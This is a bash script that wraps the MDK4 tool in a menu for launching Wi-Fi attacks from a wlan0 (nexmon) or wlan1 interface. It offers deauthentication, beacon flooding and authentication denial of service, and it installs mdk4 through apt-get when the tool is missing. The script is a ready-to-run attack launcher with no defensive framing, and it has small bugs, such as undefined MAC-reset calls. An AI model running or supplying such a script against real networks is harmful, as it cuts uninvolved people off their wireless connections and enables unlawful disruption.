#!/bin/bash

########## FUNCTIONS ##########

banner(){
    clear
    printf "############################\n"
    printf "#           MDK4           #\n"
    printf "############################\n"
}

main_menu(){
    banner
    printf "1. wlan0 - internal wireless\n"
    printf "2. wlan1 - external wireless\n"
    printf "3. exit\n\n"
    read -p "Select interface: " iface_select
    case $iface_select in
        1) iface=" "; attack_menu;;
        2) iface="wlan1"; attack_menu;;
        3) exit;;
        *) printf "Wrong number! Try again..."; sleep 1; main_menu;;
    esac
}

attack_menu(){
    banner
    printf "1. Deauthentication\n"
    printf "2. Beacon Flood\n"
    printf "3. Denial Of Service\n"
    printf "4. back\n\n"
    read -p "Attack mode: " mode
    case $mode in
        1) f_deauth;;
        2) f_bcn;;
        3) f_dos;;
        4) main_menu;;
        *) printf "Wrong number! Try again..."; sleep 1; attack_menu;;
    esac
}

f_deauth(){
    
    trap ctrl_c INT

    function ctrl_c() {
        printf "\nCtrl-C by user\n"
        # do the jobs
    }
    
    banner
    read -p "Start attack? (Y/n): " question
    case $question in
        [yY][eE][sS]|[yY])
            if [ -z $iface ]; then banner; printf "Starting nexmon on wlan0...\n"; sleep 1; . monstart-nh; printf "Launching MDK4...\n"; sleep 1; mdk4 wlan0 d; printf "\nStopping nexmon on wlan0...\n"; sleep 1; . monstop-nh; $mac_reset; else banner; printf "Launching MDK4...\n"; sleep 1; mdk4 wlan1 d; $mac_reset; fi
            ;;
        [nN][oO]|[nN])
            exit
            ;;
        *) 
            printf "Wrong answer! Try again..."; sleep 1; f_deauth;;
    esac
}

f_bcn(){
    
    trap ctrl_c INT

    function ctrl_c() {
        printf "\nCtrl-C by user\n"
        # do the jobs
    }
    
    banner
    read -p "Start attack? (Y/n): " question
    case $question in
        [yY][eE][sS]|[yY])
            if [ -z $iface ]; then banner; printf "Starting nexmon on wlan0...\n"; sleep 1; . monstart-nh; printf "Launching MDK4...\n"; sleep 1; mdk4 wlan0 b -a -s 2700; printf "\nStopping nexmon on wlan0...\n";reset_mac; sleep 1; . monstop-nh; else banner; printf "Launching MDK4...\n"; sleep 1; mdk4 wlan1 b -a -s 150 ; fi
            ;;
        [nN][oO]|[nN])
            exit
            ;;
        *) 
            printf "Wrong answer! Try again..."; sleep 1; f_bcn;;
    esac
}


f_dos(){
    
    trap ctrl_c INT

    function ctrl_c() {
        printf "\nCtrl-C by user\n"
        # do the jobs
    }
    
    banner
    read -p "Start attack? (Y/n): " question
    case $question in
        [yY][eE][sS]|[yY])
            if [ -z $iface ]; then banner; printf "Starting nexmon on wlan0...\n"; sleep 1; . monstart-nh; printf "Launching MDK4...\n"; sleep 1; mdk4 wlan0 a; printf "\nStopping nexmon on wlan0...\n"; sleep 1; . monstop-nh; else banner; printf "Launching MDK4...\n"; sleep 1; mdk4 wlan1 a; fi
            ;;
        [nN][oO]|[nN])
            exit
            ;;
        *) 
            printf "Wrong answer! Try again..."; sleep 1; f_dos;;
    esac
}

mdk4_check(){
    command -v mdk4 >/dev/null 2>&1 || { clear; printf >&2 "MDK4\e[91m is not installed!\n\e[0m"; mdk4_install;exit; }
}

mdk4_install(){
    read -p "Install mdk4? (Y/n): "  install
    case $install in
        [yY][eE][sS]|[yY])
            clear
            printf "\e[92mInstalling...\n\e[0m"
            apt-get update
            apt-get install mdk4 -y
            printf "\e[92m\nDone\n\e[0m"
            ;;
        [nN][oO]|[nN])
            printf "\nKernel Panic - not syncing: Attempted to kill init!"
            exit
            ;;
        *)
            printf "Wrong answer! Try again..."; sleep 1; mdk4_check
            ;;
    esac
}

########## START ##########
mdk4_check
main_menu
